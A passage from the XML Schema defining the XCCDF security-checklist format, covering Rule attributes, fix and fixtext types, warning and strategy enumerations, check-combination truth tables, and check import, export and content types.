                                    operators (and, or, not) and individual
                                    checks.</xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:element name="signature" type="cdf:signatureType" minOccurs="0"
                        maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A digital signature asserting
                                authorship and allowing verification of the integrity of the
                                &lt;xccdf:Rule&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="id" type="cdf:ruleIdType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Unique element identifier used by other
                            elements to refer to this element.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="role" type="cdf:roleEnumType" use="optional" default="full">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; element’s role in
                            scoring and reporting.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="severity" type="cdf:severityEnumType" default="unknown"
                    use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Severity level code to be used for metrics
                            and tracking.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="multiple" type="xsd:boolean" use="optional" default="false">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Applicable in cases where there are
                            multiple instances of a target. For example, an &lt;xccdf:Rule&gt; may
                            provide a recommendation about the configuration of application user
                            accounts, but an application may have many user accounts. Each account
                            would be considered an instance of the broader assessment target of user
                            accounts. If the @multiple attribute is set to true, each instance of
                            the target to which the &lt;xccdf:Rule&gt; can apply should be tested
                            separately and the results should be recorded separately. If @multiple
                            is set to false, the test results of such instances should be combined.
                            If the checking system does not combine these results automatically, the
                            results of each instance should be ANDed together to produce a single
                            result. If the benchmark consumer cannot perform multiple instantiation,
                            or if multiple instantiation of the &lt;xccdf:Rule&gt; is not applicable
                            for the target system, then the benchmark consumer may ignore this
                            attribute.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- *****************  Rule-related Types ************************ -->
    <!-- ************************************************************** -->
    <xsd:complexType name="identType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:ident&gt; element, a
                globally meaningful identifier for an &lt;xccdf:Rule&gt;. The body of
                &lt;xccdf:ident&gt; element is the name or identifier of a security configuration
                issue or vulnerability that the &lt;xccdf:Rule&gt; addresses. It has an associated
                URI that denotes the organization or naming scheme that assigned the name. By
                setting an &lt;xccdf:ident&gt; element on an &lt;xccdf:Rule&gt;, the
                &lt;xccdf:Benchmark&gt; author effectively declares that the &lt;xccdf:Rule&gt;
                instantiates, implements, or remediates the issue for which the name was assigned.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="system" type="xsd:anyURI" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Denotes the organization or naming scheme
                            that assigned the identifier. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:anyAttribute namespace="##other" processContents="lax">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">May also have other attributes from other
                            namespaces in order to provide additional metadata for the given
                            identifier. </xsd:documentation>
                    </xsd:annotation>
                </xsd:anyAttribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="warningType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:warning&gt; element under
                the &lt;xccdf:Rule&gt; element. This element holds a note or caveat about the item
                intended to convey important cautionary information for the &lt;xccdf:Benchmark&gt;
                user. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:htmlTextWithSubType">
                <xsd:attribute name="category" type="cdf:warningCategoryEnumType" use="optional"
                    default="general">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A hint as to the nature of the
                            warning.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:simpleType name="warningCategoryEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed warning category keywords for the
                &lt;xccdf:warning&gt; element used in &lt;xccdf:Rule&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="general">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Broad or general-purpose warning
                        (default)</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="functionality">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about possible impacts to functionality
                        or operational features</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="performance">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about changes to target system
                        performance or throughput</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="hardware">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about hardware restrictions or possible
                        impacts to hardware</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="legal">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about legal
                        implications</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="regulatory">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about regulatory obligations or
                        compliance implications</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="management">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about impacts to the management or
                        administration of the target system</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="audit">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about impacts to audit or
                        logging</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="dependency">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Warning about dependencies between this element
                        and other parts of the target system, or version
                        dependencies</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>


    <xsd:complexType name="fixTextType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:fixtext&gt; element, which
                contains data that describes how to bring a target system into compliance with an
                &lt;xccdf:Rule&gt;. Each &lt;xccdf:fixtext&gt; element may be associated with one or
                more &lt;xccdf:fix&gt; elements through the @fixref attribute. The body holds
                explanatory text about the fix procedures.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:htmlTextWithSubType">
                <xsd:attribute name="fixref" type="xsd:NCName" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A reference to the @id of an
                            &lt;xccdf:fix&gt; element. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="reboot" type="xsd:boolean" use="optional" default="0">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">True if a reboot is known to be required
                            and false otherwise. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="strategy" type="cdf:fixStrategyEnumType" use="optional"
                    default="unknown">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The method or approach for making the
                            described fix. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="disruption" type="cdf:ratingEnumType" use="optional"
                    default="unknown">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">An estimate of the potential for disruption
                            or operational degradation that the application of this fix will impose
                            on the target. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="complexity" type="cdf:ratingEnumType" use="optional"
                    default="unknown">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The estimated complexity or difficulty of
                            applying the fix to the target. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="fixType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:fix&gt; element. The body
                of this element contains a command string, script, or other system modification
                statement that, if executed on the target system, can bring it into full, or at
                least better, compliance with this &lt;xccdf:Rule&gt;. </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:element name="sub" type="cdf:subType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text substitution
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="instance" type="cdf:instanceFixType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Designates a spot where the name of the
                        instance should be substituted into the fix template to generate the final
                        fix data. If the @context attribute is omitted, the value of the @context
                        defaults to “undefined”.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:choice>
        <xsd:attribute name="id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A local identifier for the element. It is optional
                    for the @id to be unique; multiple &lt;xccdf:fix&gt; elements may have the same
                    @id but different values for their other attributes. It is used primarily to
                    allow &lt;xccdf:fixtext&gt; elements to be associated with one or more
                    &lt;xccdf:fix&gt; elements </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="reboot" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">True if a reboot is known to be required and false
                    otherwise. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="strategy" type="cdf:fixStrategyEnumType" use="optional"
            default="unknown">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The method or approach for making the described
                    fix. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="disruption" type="cdf:ratingEnumType" use="optional" default="unknown">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An estimate of the potential for disruption or
                    operational degradation that the application of this fix will impose on the
                    target. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="complexity" type="cdf:ratingEnumType" use="optional" default="unknown">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The estimated complexity or difficulty of applying
                    the fix to the target. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="system" type="xsd:anyURI" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A URI that identifies the scheme, language, engine,
                    or process for which the fix contents are written. Table 17 in the XCCDF
                    specification defines several general-purpose URNs that may be used for this,
                    and tool vendors and system providers may define and use target-specific
                    URNs.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="platform" type="xsd:anyURI" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">In case different fix scripts or procedures are
                    required for different target platform types (e.g., different patches for
                    Windows Vista and Windows 7), this attribute allows a CPE name or CPE
                    applicability language expression to be associated with an &lt;xccdf:fix&gt;
                    element. This should appear on an &lt;xccdf:fix&gt; when the content applies to
                    only one platform out of several to which the &lt;xccdf:Rule&gt; could apply.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:simpleType name="fixStrategyEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed @strategy keyword values for an
                &lt;xccdf:Rule&gt; element's &lt;xccdf:fix&gt; or &lt;xccdf:fixtext&gt; elements.
                The values indicate the method or approach for fixing non-compliance with a
                particular &lt;xccdf:Rule&gt;. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Strategy not defined
                        (default)</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="configure">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Adjust target
                        configuration/settings</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="combination">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Combination of two or more
                        approaches</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="disable">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Turn off or uninstall a target component
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="enable">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Turn on or install a target
                        component</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="patch">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Apply a patch, hotfix, update,
                        etc.</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="policy">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Remediation requires out-of-band adjustments to
                        policies or procedures</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="restrict">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Adjust permissions, access rights, filters, or
                        other access restrictions</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="update">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Install, upgrade or update the
                        system</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="ratingEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type enumerates allowed rating values the
                disruption and complexity properties of an &lt;xccdf:Rule&gt; element's
                &lt;xccdf:fix&gt; or &lt;xccdf:fixtext&gt; elements. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Rating unknown or impossible to estimate
                        (default)</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="low">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Little or no potential for disruption, very
                        modest complexity</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="medium">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Some chance of minor disruption, substantial
                        complexity</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="high">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Likely to cause serious disruption, very
                        complex</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="instanceFixType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for an &lt;xccdf:instance&gt; element which may
                appear in an &lt;xccdf:fix&gt; element. The &lt;xccdf:instance&gt; element inside an
                &lt;xccdf:fix&gt; element designates a spot where the name of the instance should be
                substituted into the fix template to generate the final fix data.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="context" type="xsd:string" default="undefined" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Describes the scope or significance of the instance
                    content. The context attribute is intended to be informative and does not affect
                    basic processing. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="complexCheckType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for an element that contains a boolean
                combination of &lt;xccdf:checks&gt;. This element can have only
                &lt;xccdf:complex-check&gt; and &lt;xccdf:check&gt; elements as children. Child
                elements may appear in any order but at least one child element must be present. It
                has two attributes, @operator and @negate, which dictate how &lt;xccdf:check&gt; or
                &lt;xccdf:complex-check&gt; child elements are to be combined. Truth tables for
                these operations appear below. </xsd:documentation>
            <xsd:appinfo>
                <evaluation_documentation>The two axes represent a pairwise combination of results.
                    Order of evaluation will not matter. Possible results are abbreviated as
                    follows: P = Pass, F = Fail, U = Unknown, E = Error, N = Not Applicable, K = Not
                    Checked, S = Not Selected, I = Informational. </evaluation_documentation>
                <evaluation_chart xml:space="preserve">
   AND             || P | F | U | E | N | K | S | I ||
-------------------||-------------------------------||
          Pass (P) || P | F | U | E | P | P | P | P ||
          Fail (F) || F | F | F | F | F | F | F | F ||
       Unknown (U) || U | F | U | U | U | U | U | U ||
         Error (E) || E | F | U | E | E | E | E | E || 
 Notapplicable (N) || P | F | U | E | N | N | N | N ||
    Notchecked (K) || P | F | U | E | N | K | K | K ||
   Notselected (S) || P | F | U | E | N | K | S | S || 
 Informational (I) || P | F | U | E | N | K | S | I ||
------------------------------------------------------ </evaluation_chart>
                <evaluation_chart xml:space="preserve">
    OR             || P | F | U | E | N | K | S | I ||
-------------------||-------------------------------||
          Pass (P) || P | P | P | P | P | P | P | P ||
          Fail (F) || P | F | U | E | F | F | F | F ||
       Unknown (U) || P | U | U | U | U | U | U | U ||
         Error (E) || P | E | U | E | E | E | E | E || 
 Notapplicable (N) || P | F | U | E | N | N | N | N ||
    Notchecked (K) || P | F | U | E | N | K | K | K ||
   Notselected (S) || P | F | U | E | N | K | S | S || 
 Informational (I) || P | F | U | E | N | K | S | I ||
------------------------------------------------------ </evaluation_chart>
                <evaluation_chart xml:space="preserve">
NOT || P | F | U | E | N | K | S | I ||
----||-------------------------------||
    || F | P | U | E | N | K | S | I ||
---------------------------------------</evaluation_chart>
            </xsd:appinfo>

        </xsd:annotation>
        <xsd:choice minOccurs="1" maxOccurs="unbounded">
            <xsd:element name="check" type="cdf:checkType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Instructions for a single
                        test.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="complex-check" type="cdf:complexCheckType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A child &lt;xccdf:complex-check&gt;, allowing
                        another level of logic in combining component checks.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:choice>
        <xsd:attribute name="operator" type="cdf:ccOperatorEnumType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Indicates whether the child &lt;xccdf:check&gt;
                    and/or &lt;xccdf:complex-check&gt; elements of this &lt;xccdf:complex-check&gt;
                    should be combined using an AND or OR operation </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="negate" default="0" type="xsd:boolean" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If true, negate the final result of this
                    &lt;xccdf:complex-check&gt; after the child elements are combined using the
                    identified operator.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:simpleType name="ccOperatorEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for the allowed @operator names for the
                &lt;xccdf:complex-check&gt; operator attribute. Only AND and OR operators are
                supported. (The &lt;xccdf:complex-check&gt; has a separate mechanism for negation.)
            </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="OR">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The logical OR of the component terms
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="AND">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The logical AND of the component
                        terms</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="checkType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check&gt; element. The
                &lt;xccdf:check&gt; element identifies instructions for tests to determine
                compliance with the &lt;xccdf:Rule&gt; as well as parameters controlling the
                reporting of those test results. The &lt;xccdf:check&gt; element must have at least
                one child element. </xsd:documentation>
            <xsd:appinfo>
                <evaluation_documentation>The two axes represent a pairwise combination of results.
                    Order of evaluation will not matter. Possible results are abbreviated as
                    follows: P = Pass, F = Fail, U = Unknown, E = Error, N = Not Applicable, K = Not
                    Checked, S = Not Selected, I = Informational. </evaluation_documentation>
                <evaluation_chart xml:space="preserve">
   AND             || P | F | U | E | N | K | S | I ||
-------------------||-------------------------------||
          Pass (P) || P | F | U | E | P | P | P | P ||
          Fail (F) || F | F | F | F | F | F | F | F ||
       Unknown (U) || U | F | U | U | U | U | U | U ||
         Error (E) || E | F | U | E | E | E | E | E || 
 Notapplicable (N) || P | F | U | E | N | N | N | N ||
    Notchecked (K) || P | F | U | E | N | K | K | K ||
   Notselected (S) || P | F | U | E | N | K | S | S || 
 Informational (I) || P | F | U | E | N | K | S | I ||
------------------------------------------------------</evaluation_chart>
                <evaluation_chart xml:space="preserve">
NOT || P | F | U | E | N | K | S | I ||
----||-------------------------------||
    || F | P | U | E | N | K | S | I ||
---------------------------------------</evaluation_chart>
            </xsd:appinfo>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="check-import" type="cdf:checkImportType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Identifies a value to be retrieved from the
                        checking system during testing of a target system. This element's body must
                        be empty within an &lt;xccdf:check&gt;. After the associated check results
                        have been collected, the result structure returned by the checking engine is
                        processed to collect the named information. This information is then
                        recorded in the check-import element in the corresponding
                        &lt;xccdf:rule-result&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="check-export" type="cdf:checkExportType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A mapping from an &lt;xccdf:Value&gt; element
                        to a checking system variable (i.e., external name or id for use by the
                        checking system). This supports export of tailoring values from the XCCDF
                        processing environment to the checking system.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="check-content-ref" minOccurs="0" maxOccurs="unbounded"
                type="cdf:checkContentRefType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Points to code for a detached check in another
                        location that uses the language or system specified by the
                        &lt;xccdf:check&gt; element’s @system attribute. If multiple
                        &lt;xccdf:check-content-ref&gt; elements appear, they represent alternative
                        locations from which a benchmark consumer may obtain the check content.
                        Benchmark consumers should process the alternatives in the order in which
                        they appear in the XML. The first &lt;xccdf:check-content-ref&gt; from which
                        content can be successfully retrieved should be used.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="check-content" minOccurs="0" maxOccurs="1"
                type="cdf:checkContentType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds the actual code of a check, in the
                        language or system specified by the &lt;xccdf:check&gt; element’s @system
                        attribute. If both &lt;xccdf:check-content-ref&gt; and
                        &lt;xccdf:check-content&gt; elements appear in a single &lt;xccdf:check&gt;
                        element, benchmark consumers should use the &lt;xccdf:check-content&gt;
                        element only if none of the references can be resolved to provide
                        content.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="system" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The URI for a checking system. If the checking
                    system uses XML namespaces, then the system attribute for the system should be
                    its namespace. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="negate" type="xsd:boolean" use="optional" default="false">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If set to true, the final result of the
                    &lt;xccdf:check&gt; is negated according to the truth table given below.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this element. Optional, but
                    must be globally unique if present.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">This may be referenced from &lt;xccdf:Profile&gt;
                    selection elements or used during manual tailoring to refine the application of
                    the &lt;xccdf:Rule&gt;. If no selector values are specified for a given
                    &lt;xccdf:Rule&gt; by &lt;xccdf:Profile&gt; elements or manual tailoring, all
                    &lt;xccdf:check&gt; elements with non-empty @selector attributes are ignored. If
                    an &lt;xccdf:Rule&gt; has multiple &lt;xccdf:check&gt; elements with the same
                    @selector attribute, each must employ a different checking system, as identified
                    by the @system attribute of the &lt;xccdf:check&gt; element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="multi-check" type="xsd:boolean" use="optional" default="false">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Applicable in cases where multiple checks are
                    executed to determine compliance with a single &lt;xccdf:Rule&gt;. This
                    situation can arise when an &lt;xccdf:check&gt; includes an
                    &lt;xccdf:check-content-ref&gt; element that does not include a @name attribute.
                    The default behavior of a nameless &lt;xccdf:check-content-ref&gt; is to execute
                    all checks in the referenced check content location and AND their results
                    together into a single &lt;xccdf:rule-result&gt; using the AND truth table
                    below. This corresponds to a @multi-check attribute value of “false”. If,
                    however, the @multi-check attribute is set to "true" and a nameless
                    &lt;xccdf:check-content-ref&gt; is used, the &lt;xccdf:Rule&gt; produces a
                    separate &lt;xccdf:rule-result&gt; for each check.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:base"/>
    </xsd:complexType>

    <xsd:complexType name="checkImportType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-import&gt; element,
                which specifies a value that the &lt;xccdf:Benchmark&gt; author wishes to retrieve
                from the checking system during testing of a target system. The @import-name
                attribute identifies some structure in the checking system that is then retrieved.
                The mapping from the values of this attribute to specific checking system structures
                is beyond the scope of the XCCDF specification. When the &lt;xccdf:check-import&gt;
                element appears in the context of an &lt;xccdf:Rule&gt;, then it should be empty and
                any content must be ignored. When the &lt;xccdf:check-import&gt; element appears in
                the context of an &lt;xccdf:rule-result&gt;, then its body holds the imported value.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any processContents="skip" minOccurs="0"/>
        </xsd:sequence>
        <xsd:attribute name="import-name" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier indicating some structure in the
                    checking system to be collected. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="import-xpath" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An XPath that is used to select specific values or
                    structures from the imported structure. This allows further refinement of the
                    collected data if the imported value takes the form of XML structures.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="checkExportType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-export&gt; element,
                which specifies a mapping from an &lt;xccdf:Value&gt; element to a checking system
                variable (i.e., external name or id for use by the checking system). This supports
                export of tailoring &lt;xccdf:Value&gt; elements from the XCCDF processing
                environment to the checking system. The interface between the XCCDF benchmark
                consumer and the checking system should support, at a minimum, passing the
                &lt;xccdf:value&gt; property of the &lt;xccdf:Value&gt; element, but may also
                support passing the &lt;xccdf:Value&gt; element's @type and @operator
                properties.</xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="value-id" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The id of the &lt;xccdf:Value&gt; element to
                    export. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="export-name" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier indicating some structure in the
                    checking system into which the identified &lt;xccdf:Value&gt; element's
                    properties will be mapped. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="checkContentRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-content-ref&gt;
                element, which points to the code for a detached check in another file. This element
                has no body, just a couple of attributes: @href and @name. The @name is optional, if
                it does not appear then this reference is to the entire document.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="href" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Identifies the referenced document containing
                    checking instructions. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="name" type="xsd:string">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Identifies a particular part or element of the
                    referenced check document. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="checkContentType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-content&gt; element.
                The body of this element holds the actual code of a check, in the language or system
                specified by the &lt;xccdf:check&gt; element’s @system attribute. The body of this
                element may be any XML, but cannot contain any XCCDF elements. XCCDF tools do not
                process its content directly but instead pass the content directly to checking
                engines. </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:any namespace="##other" processContents="skip"/>
        </xsd:choice>
    </xsd:complexType>

    <xsd:simpleType name="weightType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for an &lt;xccdf:Rule&gt; element's weight,
                a non-negative real number. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:decimal">
            <xsd:minInclusive value="0.0"/>
            <xsd:totalDigits value="3"/>
        </xsd:restriction>
    </xsd:simpleType>

    <!-- ************************************************************** -->
    <!-- *******************  Value Element  ************************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Value" type="cdf:valueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:Value&gt; element is a named parameter
                that can be substituted into properties of other elements within the
                &lt;xccdf:Benchmark&gt;, including the interior of structured check specifications
                and fix scripts.</xsd:documentation>
        </xsd:annotation>
        <xsd:unique name="valueSelectorKey">
